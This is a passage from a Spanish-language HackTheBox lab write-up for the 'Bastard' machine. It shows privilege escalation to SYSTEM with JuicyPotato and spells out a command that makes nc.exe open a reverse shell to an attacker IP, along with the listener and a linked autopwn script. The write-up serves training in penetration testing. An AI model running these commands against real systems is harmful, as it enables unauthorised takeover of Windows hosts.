+<p>📓 <strong><em>“A COM server is implemented as a COM class. A COM class is an implementation of a group of interfaces in code executed whenever you interact with a given object.”</em></strong> <a href="https://docs.microsoft.com/en-us/windows/win32/com/com-class-objects-and-clsids">docs.microsoft</a>.</p>
+
+<p>Bien, pues si queremos intentar esa explotación ¿qué nos hace falta? Exacto, el binario, lo descargamos de acá:</p>
+
+<ul>
+  <li><a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a>.</li>
+</ul>
+
+<p>Lo bajamos, le cambiamos el nombre a <code>jp.exe</code> (porque si 😬 y porque podemos (básicamente para no hacer mayus y que sea fácil de recordar)) y lo subimos a la máquina, una vez arriba al ejecutarlo deberíamos ver esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_iusrSH_jpEXE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Entonces, vamos a tomar este ejemplo y veamos que pasarle a cada parámetro:</p>
+
+<pre><code class="language-powershell">JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\Users\User\reverse_shell.exe"
+</code></pre>
+
+<ul>
+  <li>
+    <p><code>-l</code>:
+Dejaremos ese puerto por ahora.</p>
+  </li>
+  <li>
+    <p><code>-p</code>:
+Le diremos que también tome como programa la <code>cmd.exe</code> y que ella sea la que nos ejecute los argumentos (parámetro <code>-a</code>).</p>
+  </li>
+  <li>
+    <p><code>-t</code>:
+Le dejamos el mismo, así juega con las dos opciones que tiene y elige la que le funcione.</p>
+  </li>
+  <li>
+    <p><code>-c</code>:
+Para elegir el <strong>identificador del objeto</strong> debemos (para el caso de esta máquina) ir a este link (que nos lo provee el mismo post que venimos siguiendo):</p>
+
+    <ul>
+      <li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/">Windows Server 2008 R2 Enterprise - CLSIDs</a>.</li>
+    </ul>
+
+    <p>Tomamos alguno de la lista, yo seleccioné el primero:</p>
+
+    <p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7google_selectCLSID.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+  </li>
+  <li>
+    <p><code>-a</code>:
+Y como argumentos le decimos que nos genere una nueva <strong>Reverse Shell</strong> pero hacia otro puerto:</p>
+
+    <pre><code class="language-powershell">-a "/c c:\inetpub\drupal-7.54\nc.exe 10.10.14.8 4434 -e cmd.exe"
+</code></pre>
+  </li>
+</ul>
+
+<p>Listos, tenemos todo, ahora si generemos nuestra línea:</p>
+
+<pre><code class="language-powershell">.\jp.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c c:\inetpub\drupal-7.54\nc.exe 10.10.14.8 4434 -e cmd.exe"
+</code></pre>
+
+<p>Antes de ejecutarlo, nos ponemos en escucha por el puerto <code>4434</code>:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4434
+</code></pre>
+
+<p>Yyyyyyyyyyyyyy ejecutaaaaaamooooooooooooos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_jpEXE_ntsystemRevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>SI SEEEEEEEÑOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOORA, estamos dentro de la máquina como el usuario <code>nt authority\system</code> después de haber ejecutado un proceso (como ese usuario (por el <code>CLSID</code>)) que generaba una Reverse Shell. Lindo lindo.</p>
+
+<p>Y pues ya somos amos y señoras del sistema, veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<p>Peeeeeeeerrrrrfectoooo. Como ítem final nos generamos un <code>autopwn</code> el cual nos brindara una Shell directamente como el usuario <strong>NT authority\system</strong> en el sistema, lo único que necesitamos es tener en la misma ruta del script tanto el binario <code>nc.exe</code> como el binario <code>JuicyPotato.exe</code>.</p>
+
+<p><strong><em>(Claramente se puede mediante el <code>MS15-051.exe</code>, pero creo que puede ser un poquititititico complicado, ya que cuando lanzamos la revshell el programa se queda en escucha infinidad de tiempo. Tendríamos que controlar eso.)</em></strong></p>
+
+<p>La ejecución del script sería sencilla:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7bash_scriptPY_autopwn_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y rápidamente tendríamos una Shell (:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/bastard/autopwn_bastard.py">autopwn_bastard.py</a></p>
+</blockquote>
+
+<p>Y hemos terminao’</p>
+
+<p>…</p>
+
+<p>Linda máquina, el tema de <strong>Drupalgeddon2</strong> ya lo habíamos trabajado así que apenas lo vi pensé en esa vuln. El privesc me gusto bastante, primero porque lo hicimos de dos formas y segundo por el tema del <strong>kernel</strong>, muy lindo todo.</p>
+
+<p>Y bueno, nos vamos, se cuidan y nos leeremos despues, como siempre a rooooooooooooooomper toooooodo!!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Bastard&url=http://localhost:4000/htb/bastard" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#drupal">drupal</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#drupalgeddon2">drupalgeddon2</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#juicyPotato">juicyPotato</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kernel-exploit">kernel-exploit</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#windows-privileges">windows-privileges</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/optimum">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6banner.png" alt="HackTheBox - Optimum"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/optimum">HackTheBox - Optimum</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Evitamos los filtros que nos ponga HTTP File Server, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste kernel....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/armageddon">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323banner.png" alt="HackTheBox - Armageddon"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/armageddon">HackTheBox - Armageddon</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Jugaremos con CVEs, romperemos Drupal7 para ejecutar comandos, las malas configuraciones se revelarán y finalmente nos aprovechamos de nuestros permisos para ejecutar un paquete snap malicioso...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">24 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/help">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png" alt="HackTheBox - Help"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/help">HackTheBox - Help</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Investigaremos subidas de archivos .php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotación de un kernel con ganas de morir.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">22 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
